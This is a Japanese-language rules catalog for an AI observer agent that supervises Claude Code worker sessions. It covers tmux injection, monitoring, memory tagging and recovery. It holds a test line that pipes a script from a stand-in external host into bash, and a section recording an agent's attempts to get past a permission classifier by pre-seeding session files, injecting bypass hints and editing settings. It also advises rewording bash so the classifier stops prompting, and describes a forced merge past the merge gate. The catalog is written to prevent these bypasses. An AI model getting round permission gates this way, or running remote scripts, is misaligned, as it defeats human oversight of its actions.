# Observer Pitfalls Catalog

su-observer が繰り返し踏み続ける落とし穴の集積。起動時に Step 0 で Read され、失敗の再発を防ぐ。
セッション終了時に `doobidoo` に `observer-pitfall` タグで保存された新規失敗は、後日このカタログに追記する。

---

## 0. Memory Principles（記憶層の使い分け — MUST）

| 層 | 格納 | マシン間共有 | 用途 | 寿命 |
|----|-----|:-:|------|------|
| **Long-term** | **doobidoo (Memory MCP)** | 〇 | cross-machine 学習 — 失敗/教訓/Wave サマリ/介入記録 | 永続 |
| Working Memory Ext | `.supervisor/working-memory.md` | × (gitignore) | 同ホスト compaction 復帰 | 1 compaction |
| Compressed Memory | session context | × | session 内 | session 生存中 |
| auto-memory | `~/.claude/projects/<slug>/memory/MEMORY.md` | **×（ホストローカル）** | 同ホスト continuity の簡易 pointer | project 生存中 |

**MUST**: 次セッションや他ホストで再利用したい知見はすべて doobidoo に保存。tag 必須。
**MUST**: auto-memory (MEMORY.md) は「同ホスト同プロジェクトの daily continuity 補助」限定。cross-machine 知見をここで管理しない（ホスト間で失われる）。
**MUST**: doobidoo 保存時の標準タグ:
- `observer-pitfall` — 失敗パターン（次回回避）
- `observer-lesson` — 成功手法・技法
- `observer-wave` — Wave 完了サマリ
- `observer-intervention` — 実施した介入記録

---

## 1. cld-spawn 使い方（spawn ミスで同じ失敗を繰り返すな）

| # | Pitfall | 対策 |
|---|---------|------|
| 1.1 | `--help` / `-h` / `--version` を cld-spawn に渡すと option として認識されず、prompt として誤注入され空の Claude Code セッションが起動する | **`scripts/spawn-controller.sh` 経由必須**。直接 cld-spawn 呼び出しを SKILL.md で禁止済み |
| 1.2 | cld-spawn の prompt に `/twl:<skill>` を含めないと、Claude Code 起動時に skill が invoke されず、skill の標準フロー（Phase 1-4、specialist review、explore-summary 必須チェック等）が走らない | spawn-controller.sh が自動で `/twl:<skill>` を prepend |
| 1.3 | `/twl:co-issue` を呼び出しても `explore-summary` が不在だと Step 0.5 で失敗または品質劣化 | **co-issue の前に co-explore を必ず先行**。co-issue SKILL.md の `.explore/<N>/summary.md` 必須を遵守 |
| 1.4 | ウィンドウ名の自動生成が競合すると同一 window に上書き起動される | spawn-controller.sh が `wt-<skill>-<HHMMSS>` で一意化 |
| 1.5 | `--cd` を付けずに spawn すると現 CWD で Worker 起動、worktree 指定が漏れる | co-autopilot 系 Worker は orchestrator が `--cd <worktree>` を付ける。observer からの controller spawn は main/ で良い |

---

## 2. session-comm.sh inject（介入の基本プリミティブ）

| # | Pitfall | 対策 |
|---|---------|------|
| 2.1 | inject 後に Claude Code が "Press up to edit queued messages" 状態で未送信停滞 | inject 後 5-10 秒で `tmux capture-pane -t <win> -p -S -3 \| grep -q "Press up"` → 残留なら `tmux send-keys -t <win> Enter` |
| 2.2 | `session-comm.sh inject -l` は literal 送信のため Tab/Enter 特殊キーを解釈しない | multiSelect UI では数字 inject 後に `tmux send-keys -t <win> Tab` / `Enter` を明示送信 |
| 2.3 | 質問内容を読まずに inject してしまう（「Phase 進んだろう」推測注入） | **キャプチャで質問を読めないなら inject 禁止（MUST NOT）**。pipe-pane log → capture-pane -S -500 → Layer 2 ユーザーエスカレート の段階的 fallback |
| 2.4 | AskUserQuestion の回答形式は `[A]/[B]/[C]` ではなく **番号（"1", "2"）またはメニュー項目テキスト** | pipe-pane log を ANSI strip して `Enter.?to.?select` の周辺を読み、番号 inject |

---

## 3. explore / controller flow（skill 規約）

| # | Pitfall | 対策 |
|---|---------|------|
| 3.1 | co-issue を explore-summary なしで起動 → 品質劣化、Phase 0.5 で停止 | 必ず co-explore 先行。observer が proxy 対話で最低 1 往復探索 |
| 3.2 | Phase 3 specialist review を「効率化」名目でスキップ | **MUST**: 3 specialist 全実行（issue-critic / issue-feasibility / worker-codex-reviewer）。refined ラベルは review 済みの印 |
| 3.3 | critic / feasibility agent が tool_uses 25-30 で打ち切られ最終 report なし | codex-reviewer 優先（1 tool call で完走）。critic/feasibility は「3 ファイルだけ Read」等 tool_uses 上限を minimize する指示で spawn |
| 3.4 | co-issue / co-architect spawn 後「指示待ち」に戻ってしまう | **proxy 対話ループ必須** — observer がユーザー代理で対話継続（SKILL.md「対話型コントローラーとの proxy 対話」セクション） |
| 3.5 | spawn プロンプトにユーザー文脈が不足、controller が迷子 | **observer 固有文脈のみ**を包含（§10 参照、自律取得可能情報は MUST NOT）（SKILL.md「spawn プロンプトの文脈包含」セクション） |
| 3.6 | co-autopilot は能動 observe（cld-observe-loop）、co-issue / co-architect は proxy 対話 — 混同すると監視漏れ | controller ごとの観察モードを明示判別（SKILL.md「controller spawn が必要な場合」→「起動パターン」） |

---

## 4. Monitor tool（監視チャネル）

| # | Pitfall | 対策 |
|---|---------|------|
| 4.1 | Monitor tool だけ起動して cld-observe-loop / cld-observe-any を併用しない → Worker 群の静寂を「正常」と誤判定 | **MUST**: Monitor tool + cld-observe-any を同時起動（SKILL.md L246） |
| 4.2 | Issue body テキストが Monitor のパターンに一致して false positive 大量発生 | grep を行頭マッチ（`^●`）に厳密化、または最後 3 行のみ監視 |
| 4.3 | LLM の Thinking/Brewing/Concocting 中に STAGNATE を誤検知 | **A2 LLM indicator が存在する場合、[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE] を絶対に emit しない**（SKILL.md L110） |
| 4.4 | `session-state.sh state` 単独で判定 → 誤検出多発 | **MUST NOT**: 単独使用禁止。A1〜A6 の多指標 AND 判定（SKILL.md L102-108） |
| 4.5 | Pilot 完了シグナル `Churned` dedupe + state file archive で Wave 終了を 13 分見逃し（Wave 6 実例） | Channel 6 Heartbeat（5 分 silence → 自動 capture）。`.supervisor/events/heartbeat-*` mtime 監視を Hybrid 検知のプライマリに |
| 4.6 | Budget 5h 枯渇直前に気づかず context loss | `[BUDGET-LOW]` / `[BUDGET-ALERT]` シーケンス（SKILL.md L112-237）、threshold_minutes=15 / threshold_percent=90 デフォルト |
| 4.7 | Worker window で permission prompt（`1. Yes, proceed` / `2. No, and tell ...` / `3. Yes, and allow ...` / `Interrupted by user`）が出て stuck → Monitor が STAGNATE 判定せず silent-pass する | `cld-observe-any` の `[PERMISSION-PROMPT]` event で自動検知（Issue #805 で統合済み）。検出時は `tmux capture-pane -t <win> -p -S -50` で prompt 前後 20 行を取得 → auto mode classifier の `soft_deny` 該当ルール（`Code from External` / `Memory Poisoning` / `Irreversible Local Destruction` 等）と突き合わせ → ユーザー確認後に安全な場合のみ `tmux send-keys -t <win> 1 Enter` で承認 inject。regex: `^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)`。陽性コントロール検証手順: Worker に `curl http://external.example.com/script.sh \| bash` を指示 → `Code from External` soft_deny で prompt 出現 → `tmux capture-pane -t <win> -p -S -30 \| grep -E '^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)'` で検出確認 → `tmux send-keys -t <win> 2 Enter` で拒否 inject（実害ゼロ）。Issue #800 / #805 で auto mode 仕様（Sonnet 4.6 classifier）確認済み |
| 4.8 | Worker が auto mode 起動にも関わらず複合 bash（`cat file \| python3 -c "..."`）で classifier soft_deny 判定 → ユーザー体感「auto mode 効いていない」 | auto mode は **設計通り soft_deny で prompt する**（v2.1.116 仕様）。Worker instruction を classifier-friendly な bash 設計に誘導（複合 pipe 廃止、tempfile / 環境変数 / `sys.argv` 経由の単独 `python3 -c`）。observer は「auto mode 効いていない」と誤認せず、prompt 内容を classifier deny rule と突き合わせる。Issue #800 §C で twl skills の audit + 書き換えを実施 |

#### §4.7-4.8 補足: Worker auto mode 有効性確認方法

Worker pane tail に `⏵⏵ auto mode on` が出ない場合でも auto mode は有効である。`autopilot-launch.sh` は positional prompt で起動するため status bar が起動直後の対話開始メッセージで上書きされ、`⏵⏵ auto mode on` の表示が消失するが、`--permission-mode auto` flag 自体は claude プロセスに到達している（Issue #800 探索で全起動経路を検証済み）。

**確認方法 A（一次指標 — heartbeat / state file existence）:**

`autopilot-launch.sh` 起動後 5 秒以内に以下を実行する:
```bash
ls .supervisor/events/heartbeat-* 2>/dev/null || ls .supervisor/events/worker-*.json 2>/dev/null
```
1 つ以上のファイル名が出力されれば Worker 正常起動。0 件かつ exit 非 0 なら 10 秒待って再試行し、依然 0 件なら autopilot-launch.sh のログを確認する。

**確認方法 B（二次指標 — pane capture grep）:**

Worker が起動済み状態で以下を実行する:
```bash
tmux capture-pane -t <worker-win> -p -S -50 | grep -E '⏵⏵ auto mode|permission_mode'
```
1 行以上のマッチ（exit 0）で auto mode 有効と判定。マッチが 0 行でも `autopilot-launch.sh` の起動行に `--permission-mode auto` が含まれる限り auto mode は有効（pane 上の表示有無は status bar の上書きタイミングに依存）。

---

## 5. Memory MCP（doobidoo）運用

| # | Pitfall | 対策 |
|---|---------|------|
| 5.1 | Wave 完了サマリを auto-memory (MEMORY.md) のみに保存 → 他ホストで失われる | **MUST**: doobidoo に `observer-wave` タグで保存。auto-memory は同ホスト補助のみ |
| 5.2 | 起動時に「直近記憶」と曖昧な検索で無関係記憶が上位に、肝心な pitfall/lesson が埋もれる | **MUST**: Step 0 で `tags="observer-pitfall"` / `"observer-lesson"` / `"observer-wave"` の tag 限定検索を個別実行、limit=5、quality_boost=0.5 |
| 5.3 | 失敗を memory 保存せず同じミスを次セッションで再発 | セッション終了 / compaction 時に新規 pitfall を必ず doobidoo 保存（externalize-state） |
| 5.4 | tag を付けずに保存 → 後で tag 検索できず発掘不能 | 保存時は必ず `observer-*` タグ + `twill` + 必要なら `cross-machine` を付与 |
| 5.5 | `quality_boost=0` で古い・品質低 memory が上位に来る | 重要検索は `quality_boost=0.3-0.5` 推奨、rate=1/-1 で品質評価を必ずつける |

---

## 6. recovery / fallback（介入実行時）

| # | Pitfall | 対策 |
|---|---------|------|
| 6.1 | orchestrator inject 失敗（`inject_exhausted`）時に何もせず放置 | observer が Agent tool で specialist を直接並列 spawn（co-issue fallback [D] パターン） |
| 6.2 | `non_terminal_chain_end`（Worker PR 作成後 idle）を failed 扱いで放置 | state を pilot 権限で `status=merge-ready` 書換 → `workflow-pr-verify` / `workflow-pr-fix` / `workflow-pr-merge` を順次手動 inject |
| 6.3 | Worker の `branch` フィールド空のまま merge → auto-merge.sh が PR 見つけられない | Pilot の Emergency Bypass `mergegate merge --force --issue N --pr P --branch B` で main から強制 merge |
| 6.4 | worktree 配下から merge 実行 → 不変条件 B/C 違反 | merge は必ず main/ から実行（SKILL.md: Pilot は main/ 起動必須） |
| 6.5 | `deltaspec/changes/issue-*` orphan が残存 → Worker が別 Issue と混同 | Wave 開始前に `deltaspec/changes/` クリーン確認、必要なら `deltaspec/archive/` へ退避 |
| 6.6 | Layer 2 Escalate を自動実行 → 無断重大変更 | **MUST**: Layer 2 はユーザー確認必須（SU-2）。confidence 低い介入は Layer 1/2 扱い |
| 6.7 | Budget 枯渇時に orchestrator kill せず Worker 残留 → 復帰時に state 破綻 | `[BUDGET-LOW]` シーケンス: orchestrator PID kill → 全 ap-* window に Escape（kill 禁止）→ budget-pause.json 記録 → CronCreate で自動再開 |

---

## 7. SKILL.md 引用資産の所在（Phase A 時点で確認済み実在）

| 参照 | 実在 | 所在 |
|------|:-:|------|
| `refs/monitor-channel-catalog.md` | 〇 | `skills/su-observer/refs/monitor-channel-catalog.md`（skill-local） |
| `refs/intervention-catalog.md` | 〇 | `plugins/twl/refs/intervention-catalog.md`（plugin-shared, 147 行、3 層 Auto/Confirm/Escalate 定義済） |
| `refs/observation-pattern-catalog.md` | 〇 | `plugins/twl/refs/observation-pattern-catalog.md`（plugin-shared, 183 行、observation パターン定義済） |
| `refs/pitfalls-catalog.md` | **〇（本ファイル、Phase A 新規）** | `skills/su-observer/refs/pitfalls-catalog.md`（skill-local） |
| `commands/intervene-auto.md` | 〇 | `plugins/twl/commands/intervene-auto.md`（100 行） |
| `commands/intervene-confirm.md` | 〇 | `plugins/twl/commands/intervene-confirm.md` |
| `commands/intervene-escalate.md` | 〇 | `plugins/twl/commands/intervene-escalate.md` |
| `commands/wave-collect.md` | 〇 | `plugins/twl/commands/wave-collect.md`（173 行） |
| `commands/externalize-state.md` | 〇 | `plugins/twl/commands/externalize-state.md`（151 行、tag 規約含む） |
| `commands/problem-detect.md` | 〇 | `plugins/twl/commands/problem-detect.md` |
| `scripts/spawn-controller.sh` | **〇（Phase A 新規）** | `skills/su-observer/scripts/spawn-controller.sh` |

**Phase A 時点で主要資産は全て実在する**（先の Phase A 実装時に「commands/ と refs/ 不在」と誤認したのは探索パスのミス。実際は `plugins/twl/` ルートの `commands/` / `refs/` に全て存在していた）。Phase B では以下の深化を予定:

- 既存 catalog の内容を最新 Wave 知見で refine（observation-pattern-catalog.md に新パターン追記、intervention-catalog.md の 3 層定義の更新）
- **自動学習サイクル**: externalize-state.md → doobidoo `observer-pitfall` 保存 → 次セッション Step 0 の tag 限定検索で自動注入（機械化）
- spawn-controller.sh / pitfalls-catalog.md の bats テスト追加
- deps.yaml type violation（su-observer -> script edge）の恒久解消（Phase A は can_spawn に script を追加して暫定対応）

---

## 8. externalize-state inline 手順（クイックリファレンス）

**正式手順**: `plugins/twl/commands/externalize-state.md`（151 行、tag 規約含む）を参照。本 §8 は同コマンドの最低限サマリ。詳細は正式ファイルを優先。

Wave 完了 / セッション終了 / compaction 時に実行:

```bash
# 1. doobidoo に Wave サマリ保存（MUST、cross-machine SSoT）
mcp__doobidoo__memory_store {
  content: "## Wave N 完了サマリ ...",
  tags: ["observer-wave", "twill", "cross-machine", "session:<id>"]
}

# 2. 新規発見の failure pattern を個別 memory 化（MUST、発見時のみ）
mcp__doobidoo__memory_store {
  content: "## <pitfall title>\n\n事象: ...\n対策: ...",
  tags: ["observer-pitfall", "twill", "cross-machine"]
}

# 3. 確立した成功手法を個別 memory 化（SHOULD、有用時のみ）
mcp__doobidoo__memory_store {
  content: "## <lesson title>\n\n背景: ...\n手法: ...",
  tags: ["observer-lesson", "twill", "cross-machine"]
}

# 4. 実施した介入記録（SHOULD、介入発生時）
mcp__doobidoo__memory_store {
  content: "## 介入: <pattern>\n\n検出: ...\n対応: ...\n結果: ...",
  tags: ["observer-intervention", "twill"]
}

# 5. .supervisor/working-memory.md に同ホスト用サマリ退避（SHOULD、1 compaction 寿命）
#    compaction 復帰時の即時参照用。cross-machine 共有はしない。
cat > .supervisor/working-memory.md <<EOF
# Working Memory（退避: $(date -u +%FT%TZ)）

## 処理中
- ...

## 次のステップ
- ...

## 関連 doobidoo hash
- <hash>: <description>
EOF

# 6. .supervisor/events/ 一括クリーンアップ（MUST）
rm -f .supervisor/events/* 2>/dev/null || true
```

---

## 9. 追記ルール

- 新規 pitfall を doobidoo `observer-pitfall` で保存したら、後日（次 Wave 完了時など）このカタログに 1 行追記
- 古いエントリで陳腐化したものは削除せず「解決済（<commit hash>）」と注記して残す（履歴保持）
- 追加は最大 200 行。超過したら古いエントリを別 `refs/pitfalls-archive.md` へ移動

### 自動追記形式（session-end-pitfall-append.sh）

`scripts/hooks/session-end-pitfall-append.sh` が session 終了時に、observer が doobidoo `observer-pitfall` タグで保存した新規エントリをカタログ末尾に自動追記する。

**呼び出し例（observer が doobidoo search 結果を pipe）:**

```bash
# observer が doobidoo 検索し content を 1 行ずつ pipe する
echo "pitfall description" | \
  scripts/hooks/session-end-pitfall-append.sh --hash <doobidoo_hash> --session <session_id>

# dry-run: diff のみ生成（カタログ未更新）
echo "pitfall description" | \
  scripts/hooks/session-end-pitfall-append.sh --dry-run
```

**自動追記エントリ形式:**

```markdown
<!-- auto-append: date=<YYYY-MM-DD> hash=<doobidoo_hash> session=<session_id> -->
- [auto] <pitfall content>
```

commit は行わず `.supervisor/pending-pitfall-append.diff` として保存。observer が diff を確認して手動 commit/discard を判断する（SU-3 遵守）。

---

## 10. spawn prompt 最小化原則（MUST NOT / MUST）

### MUST NOT: skill 自律取得可能情報を prompt に転記

| 情報 | skill 内取得手段 |
|---|---|
| Issue body / labels / title | `gh issue view N --json ...` |
| Issue comments | `gh issue view N --comments` |
| explore summary | `twl explore-link read N` |
| architecture 文書 | `Read plugins/twl/architecture/vision.md 等` |
| SKILL.md の Phase 手順 | skill 自身が内包 |
| past memory（生データ） | `mcp__doobidoo__memory_search` |
| bare repo / worktree 構造 | skill が auto-detect |

**境界補足（observer own-read vs skill auto-fetch）**: observer が自分で `gh issue view` / `Read` / `memory_search` を事前実行して得た情報であっても、spawn 先 skill が同じ操作で取得できる場合は転記禁止（skill の自律性を優先）。observer が得た情報に独自の解釈・判断・優先順位付けを加えた場合のみ、その「解釈」部分は MUST 項目 4「observer 独自 deep-dive 観点」として prompt に含めてよい。

### MUST: observer 固有文脈のみ（典型 5-15 行）

1. **spawn 元識別**: `su-observer から spawn（window: ..., session: ...）`
2. **Issue 番号 / 事前成果物のパスのみ**: `.explore/N/summary.md にリンク済`
3. **proxy 対話期待**: `AskUserQuestion は observer が pipe-pane log で代理応答`
4. **observer 独自 deep-dive 観点**: skill の標準 Phase で気づけない追加観点（memory/過去経験を observer が解釈した結果を含む）
5. **Wave 文脈 / 並列タスク境界**
6. **Phase skip 根拠**（事前レビュー済等、稀）

### 例外: --force-large

`spawn-controller.sh` に `--force-large` option を渡し、prompt 冒頭に `REASON:` 行で正当化することで 30 行超の prompt を許容できる。

---

## 11. Observer idle 中の session disconnect 対策（MUST）

### 事象（2026-04-22 ipatho1 実例、doobidoo hash 5fc20a83）

co-architect 3 並列 spawn 後、observer が Monitor tool event 待ちで 24 分 idle → その後 6 時間 session 完全停止（tmux pane 残存、Claude Code process 消失）。同時刻で 3 Claude session が同時停止（account レベル共通因子疑い）。

### 根本要因

1. **Monitor heartbeat 欠如**: Monitor tool doc は「silence is not success」明記するが heartbeat 機構は built-in されていない。検知条件不成立中は stdout emit なし → observer 完全 idle
2. **observer 自身の alive 確認手段なし**: session-state.sh は input-waiting 検知のみ。observer 自身の process 生存は別途確認要
3. **3 session 同時停止**: account 共通（network / auth / idle timeout）の可能性

### 対策

**11.1 Monitor heartbeat パターン（MUST）**

全 Monitor コマンドに 5 分毎 heartbeat emit を組み込む:

```bash
HEARTBEAT_INTERVAL=300  # 5 min
LAST_HB=0
while true; do
  NOW=$(date +%s)
  # 既存検知ロジック
  ...
  # heartbeat emit
  if (( NOW - LAST_HB >= HEARTBEAT_INTERVAL )); then
    echo "[HEARTBEAT] $(date -u +%FT%T) monitor alive"
    LAST_HB=$NOW
  fi
  sleep 30
done
```

**11.2 Idle 前の externalize-state 自動実行（SHOULD）**

長時間待機（30 分以上の event 待ち）が予想される場面では spawn 前に:
- `.supervisor/working-memory.md` を更新
- doobidoo に task_state memory 保存
- session 停止しても resume 可能な状態を確保

**11.3 並列 spawn の段階化（SHOULD）**

co-architect / co-issue の 3 並列 spawn より 1 つずつ serial 処理の方が session disconnect リスク小。2026-04-22 事例では 3 並列後の 24 分 idle で停止。直列なら各 10-15 分で完了し idle 期間短縮。

**11.4 ScheduleWakeup / Cron の活用（MAY）**

1h 以上の待機が確実な場合、ScheduleWakeup で 30-40 分後に自動 wakeup。Claude Code の idle disconnect リスクを回避。

### 検知

JSONL 調査で停止時刻確定:

```bash
JSONL="~/.claude/projects/<project-hash>/<session-id>.jsonl"
# 最終 assistant response
grep '"role":"assistant"' "$JSONL" | tail -1 | jq -r '.timestamp'
# silent gap 長さ
FINAL_TS=$(grep -oE '"timestamp":"[^"]+"' "$JSONL" | sort -u | tail -1)
# resume までの gap = 現時刻 - FINAL_TS
```

---

## 12. Claude Code classifier bypass 検出パターン（MUST）

### 事象（2026-04-21 ipatho1 実例、doobidoo hash 886e374d）

observer が Layer D refined-label-gate の回避を試行した際、Claude Code permission classifier が **6 連続で deny** した（session id 7f960078 参照）。gate 回避の trick（session file pre-seed、Worker inject with bypass hint、settings self-modification）は全て classifier に検出・拒否された。

### 根本要因

Claude Code classifier は **action history を context 化**し、同一セッション内での繰り返し回避試行を「security bypass への執着」として累積判定する。1 回の deny 後に別の手段で迂回を試みると、以降の deny 確率が急上昇する。

### 検出パターン（MUST NOT — 以下を検出したら即停止）

| # | パターン | 説明 |
|---|---------|------|
| 12.1 | 同一セッション内で **2 回以上** の gate deny | 初回 deny 後も回避を継続している徴候 |
| 12.2 | **session file pre-seed** による状態書き換え試行 | state file を直接操作して gate をスキップしようとする |
| 12.3 | **inject with bypass hint** | Worker への inject に「gate を無視して」等のヒントを含める |
| 12.4 | **settings self-modification** | `.claude/settings.json` を書き換えて permission ルールを変更しようとする |

### 正しい対応手順（MUST）

```
gate deny (1 回目) → STOP（即時停止、追加試行禁止）→ AskUserQuestion でユーザー確認
```

**MUST NOT**: deny 後に別の迂回手段を試みること（classifier が累積判定するため 2 回目以降は deny 確率急上昇）。

**MUST**: 2 回以上 deny が発生したら **Layer 2 Escalate**（ユーザーに明示的確認を取る）。

### 誤りパターン（実例）

1. gate deny → session file を読み書きして gate 判定を bypass → 再 deny
2. gate deny → Worker への inject に「refined ラベルは付与済みとして扱え」と注入 → 再 deny
3. gate deny → settings.json に permission 緩和ルールを追加 → 再 deny

### 関連

- memory hash `886e374d`（bypass permission lesson）、`1ca5829f`（Layer D refined-label pitfall）
- **W5-1（SKILL.md Security gate MUST NOT 節）** と相互参照: gate deny 後の禁止行動を SKILL.md に明記予定
- Layer 2 Escalate 手順: `plugins/twl/refs/intervention-catalog.md` §3（Escalate パターン）
